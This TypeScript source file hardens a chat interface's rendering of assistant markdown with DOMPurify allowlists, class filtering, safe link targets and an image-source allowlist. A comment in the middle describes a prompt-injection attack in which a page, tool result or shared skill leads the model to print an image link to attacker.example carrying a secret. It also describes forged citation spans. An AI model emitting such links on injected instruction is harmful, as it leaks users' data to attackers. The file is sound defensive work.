/**
 * HTML hardening helpers for the chat rendering path.
 *
 * Assistant messages are markdown rendered by `marked` and handed to
 * `innerHTML`. That markdown frequently carries tool-result content verbatim
 * (mail bodies, document text, web pages), so the rendered HTML has to be
 * treated as untrusted before it reaches the DOM, and again on every reload
 * because it is persisted in conversation history.
 *
 * Two helpers live here:
 *  - {@link sanitizeMarkdownHtml} — runs marked's output through DOMPurify with
 *    an allowlist sized to what marked actually emits, then refuses every
 *    image source outside the two this app serves (see {@link isAllowedImageSource}).
 *  - {@link escapeHtmlAttribute} — for values interpolated into attributes of
 *    markup we generate ourselves (entity/reference annotations).
 */

import DOMPurify from 'dompurify'

/**
 * Tags `marked` emits for the feature set the chat uses (gfm + breaks):
 * headings, emphasis, code fences, lists, task-list checkboxes, tables,
 * blockquotes, links and images — plus the `span`/`sup` the entity and
 * reference annotators add on top of the rendered HTML.
 */
const ALLOWED_TAGS = [
  'p',
  'br',
  'hr',
  'strong',
  'em',
  'del',
  'code',
  'pre',
  'a',
  'ul',
  'ol',
  'li',
  'input',
  'blockquote',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'table',
  'thead',
  'tbody',
  'tfoot',
  'tr',
  'th',
  'td',
  'img',
  'span',
  'sup',
  'sub',
]

/**
 * Attributes to keep. `align` is what gfm tables put on cells; `class` is kept
 * as a tag, but its *value* is filtered — see {@link CLASS_ALLOWLIST}.
 *
 * The interactive hooks (`data-entity-name`, `data-entity-ids`, `data-doc-id`)
 * are deliberately **absent** (SA-M10). They used to be allowlisted here, which
 * meant model output containing
 * `<span class="doc-ref" data-doc-id="…">` survived sanitization and rendered
 * as a real, clickable citation pointing wherever the model chose — a
 * provenance spoof, in the one part of the UI whose entire job is to say where
 * an answer came from. The annotators in `ChatMessages` run *after* this
 * function and emit those attributes themselves, so nothing genuine is lost:
 * every surviving citation is now one this code put there.
 *
 * `target` and `rel` are absent for the same reason: {@link forceLinkTargetBlank}
 * sets them below, after DOMPurify has stripped whatever the model wrote, so the
 * only values that reach the DOM are this code's.
 *
 * Every attribute that makes a browser fetch on its own is absent too — `style`
 * (CSS `url()`), `srcset`, `poster`, `background`, `ping`, `data` — and so is
 * every tag that fetches on its own: `iframe`, `link`, `style`, `video`,
 * `audio`, `picture`/`source`, `object`, `embed`, `svg` (see
 * {@link ALLOWED_TAGS}). `src` is the one such attribute kept, because `<img>`
 * needs it, and it is judged afterwards by {@link blockAutoLoadingSources}.
 * Adding any of the others here re-opens a channel that function does not
 * look at.
 */
const ALLOWED_ATTR = [
  'href',
  'src',
  'alt',
  'title',
  'class',
  'align',
  'type',
  'checked',
  'disabled',
]

/**
 * Class values the chat renderer is allowed to carry through sanitization.
 *
 * `class` cannot simply be dropped — `marked` puts `language-*` on code fences
 * and the gfm task-list item class on `li` — but an unfiltered `class` is how a
 * forged `doc-ref` / `graph-entity` span passes for a real one. So the
 * attribute survives and the *value* is reduced to this allowlist: a
 * `language-*` prefix, plus the two task-list classes marked emits. Every
 * interactive class the chat responds to is added by the annotators after this
 * runs, and can therefore never come from model text.
 */
const CLASS_ALLOWLIST = new Set(['task-list-item', 'contains-task-list'])

/** Keep only allowlisted class tokens; drop the attribute when none survive. */
function filterClassAttribute(node: Element): void {
  const raw = node.getAttribute('class')
  if (raw === null) return
  const kept = raw
    .split(/\s+/)
    .filter((token) => token.startsWith('language-') || CLASS_ALLOWLIST.has(token))
  if (kept.length === 0) node.removeAttribute('class')
  else node.setAttribute('class', kept.join(' '))
}

/**
 * Point every rendered link at a new tab.
 *
 * House rule: the app never navigates away to follow a link. Chat markdown is
 * the one place links are produced from data rather than written by hand, so
 * the rule is enforced at this chokepoint instead of at each call site — every
 * assistant message passes through here, including the ones re-rendered from
 * persisted history.
 *
 * `rel` is not cosmetic: `target="_blank"` alone hands the opened page a live
 * `window.opener` back into the app, and these hrefs come from model output.
 */
function forceLinkTargetBlank(node: Element): void {
  if (node.nodeName !== 'A' || !node.hasAttribute('href')) return
  node.setAttribute('target', '_blank')
  node.setAttribute('rel', 'noopener noreferrer')
}

/** The per-node fixups, as one hook so `removeHook` takes both off again. */
function hardenAttributes(node: Element): void {
  filterClassAttribute(node)
  forceLinkTargetBlank(node)
}

// ============================================================================
// Images: the one auto-loading channel the allowlist leaves open
// ============================================================================
//
// An `<img>` fetches its `src` as soon as the markup reaches the live document
// — no click, no hover — and again on every reload, because the answer is
// persisted. And the answer is not only the model's own words: a fetched page,
// a tool result or (#423) another user's shared skill can tell the model to
// print `![](https://attacker.example/?d=<secret>)`, and RENDERING that line is
// the exfiltration. The injection guard's `exfil-auto-image` rule does not
// reach it — it rewrites guarded tool RESULTS, and this is the model's OUTPUT,
// on every agent, guarded or not. An image proxy would not close it either:
// the proxy fetches the attacker's URL itself, query string and all.
//
// So the rule is the inverse of "block what looks remote": an image is kept
// only when its source is one of the two below, and is otherwise replaced by
// inert text. "Same origin" is deliberately NOT one of them. An image is an
// authenticated GET the page fires on the reader's behalf, so any GET route
// with a side effect would run on every render of that answer. This app had
// two — `/api/auth/logout` signed the reader out and fired `session_end`
// routines, `/api/sandbox/pty/stream` claimed a session and booted a
// container — until #429 moved both behind a same-origin POST
// (`lib/auth/csrf.server.ts`). The rule stays: it does not depend on every
// future GET route being free of side effects. The CSP's `img-src 'self'`
// permits exactly that request, which is why this function, not the header,
// is the control.

/**
 * Exception 1 — a `data:` raster image.
 *
 * Nothing is fetched: the bytes ARE the URL, so no request leaves the page and
 * there is nowhere for data to go. Raster types only; an SVG in an `<img>`
 * cannot script or fetch either, but a rule that admits only pixels needs no
 * argument about what an SVG can do. Base64 only, which is how every encoder
 * writes one, and anchored at both ends with no nested quantifier, so a long
 * value costs one linear pass.
 */
const DATA_IMAGE = /^data:image\/(?:png|jpeg|gif|webp);base64,[a-z0-9+/]+={0,2}$/i

/**
 * Cap on a `data:` image, in characters (~190 KB decoded). Not an exfiltration
 * control — exception 1 has nothing to exfiltrate through — but a bound on what
 * one persisted answer can make every later reader decode, and what the
 * placeholder for a refused one has to shorten.
 */
const MAX_DATA_IMAGE_LENGTH = 256 * 1024

/**
 * Exception 2 — the Data Stash's raw-download route,
 * `/api/stash/document/<id>?sessionId=…&download` (`lib/api-client.ts`'s
 * `stashDocumentDownloadUrl`): the only route in this app that serves a file's
 * bytes, and so the only one an uploaded image, a sandbox chart promoted out of
 * `/work/out` or a stored attachment can be shown from. It is a read with no
 * side effect, and it is owner-gated (`withUser` + `requireSessionOwner`), so
 * on a shared transcript (`/s/:token`) a visitor's browser is refused — 401
 * signed out, 404 signed in as anyone else — rather than served the owner's
 * file. The id segment is the alphabet stash ids are minted in (a UUID,
 * or the `doc-<base36>-<base36>` fallback), so no `%2F` or other encoded
 * separator can ride inside it.
 *
 * Nothing renders one today — no prompt asks for an inline image, and charts
 * and attachments surface in the Data Stash panel instead — so this keeps the
 * one shape an inline chart would take working rather than serving a current
 * caller.
 */
const STASH_DOWNLOAD_PATH = /^\/api\/stash\/document\/[a-z0-9-]+$/i

/** How much of a refused source the placeholder shows. */
const BLOCKED_SOURCE_SHOWN = 120

/**
 * Whether an `<img src>` may load. The URL is resolved with the platform's own
 * parser against the page, which is the parse the browser would make — so
 * `//host`, `/\host`, leading whitespace, embedded tabs and `..` segments are
 * judged as what they would fetch, not as the string they look like.
 */
function isAllowedImageSource(src: string): boolean {
  if (src.length <= MAX_DATA_IMAGE_LENGTH && DATA_IMAGE.test(src)) return true
  let url: URL
  try {
    url = new URL(src, window.location.href)
  } catch {
    return false
  }
  return (
    url.origin === window.location.origin &&
    STASH_DOWNLOAD_PATH.test(url.pathname) &&
    url.searchParams.has('download')
  )
}

/**
 * The inert text that stands where a refused image was: it says what happened
 * and shows the source as plain text — not a link, and not in any attribute a
 * browser loads. `blocked-image` is a preflight class (`uno.config.ts`), set
 * here AFTER DOMPurify ran, so it is this code's markup and never the model's.
 */
function blockedImagePlaceholder(img: Element, src: string): Element {
  const placeholder = img.ownerDocument.createElement('span')
  placeholder.setAttribute('class', 'blocked-image')
  placeholder.setAttribute(
    'title',
    'Not loaded: an image in an answer is fetched automatically, which would send a ' +
      'request (and anything in its address) to wherever it points.',
  )
  const shown = src.length > BLOCKED_SOURCE_SHOWN ? `${src.slice(0, BLOCKED_SOURCE_SHOWN)}…` : src
  placeholder.textContent = `Image blocked: ${shown}`
  return placeholder
}

/**
 * Close every `src` the allowlist leaves reachable. Two elements in
 * {@link ALLOWED_TAGS} can carry one: `img`, judged above, and `input` —
 * `<input type="image" src="…">` fetches its source exactly like an image, and
 * marked only ever emits a checkbox there, so `src` is simply removed from
 * anything that is not an `<img>`.
 *
 * Runs on the INERT document DOMPurify parsed into (it has no browsing
 * context, so nothing in it loads), before the markup is serialized for
 * `innerHTML` — never on an element of the live page, where an `<img>` would
 * start fetching the moment it was created.
 */
function blockAutoLoadingSources(root: Element): void {
  for (const el of Array.from(root.querySelectorAll('[src]'))) {
    const src = el.getAttribute('src') as string
    if (el.nodeName !== 'IMG') el.removeAttribute('src')
    else if (!isAllowedImageSource(src)) el.replaceWith(blockedImagePlaceholder(el, src))
  }
}

/** Escape a value for interpolation into text or a double-quoted attribute. */
export function escapeHtmlAttribute(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

/**
 * Sanitize HTML produced by `marked` before it is assigned to `innerHTML`.
 *
 * Runs client-side only. The chat message list starts empty and is filled by
 * client-side effects (history hydration, live runs), so this never executes
 * during SSR; DOMPurify needs a DOM and its own `sanitize()` is a no-op pass
 * through when unsupported, so any DOM-less environment falls back to escaping
 * the markup into inert text rather than returning it unchanged.
 */
export function sanitizeMarkdownHtml(html: string): string {
  if (typeof window === 'undefined' || !DOMPurify.isSupported) {
    return escapeHtmlAttribute(html)
  }
  // `afterSanitizeAttributes` runs per node, after DOMPurify has applied
  // ALLOWED_ATTR. Registered and removed around the single call rather than at
  // module load, so this hook only ever sees this function's nodes.
  DOMPurify.addHook('afterSanitizeAttributes', hardenAttributes)
  let body: Element
  try {
    // RETURN_DOM hands back the inert document's <body> rather than a string,
    // so the image pass below runs where nothing can load. Serializing it is
    // exactly what DOMPurify's own string return does.
    body = DOMPurify.sanitize(html, {
      ALLOWED_TAGS,
      ALLOWED_ATTR,
      ALLOW_DATA_ATTR: false,
      RETURN_DOM: true,
    }) as Element
  } finally {
    DOMPurify.removeHook('afterSanitizeAttributes')
  }
  blockAutoLoadingSources(body)
  return body.innerHTML
}
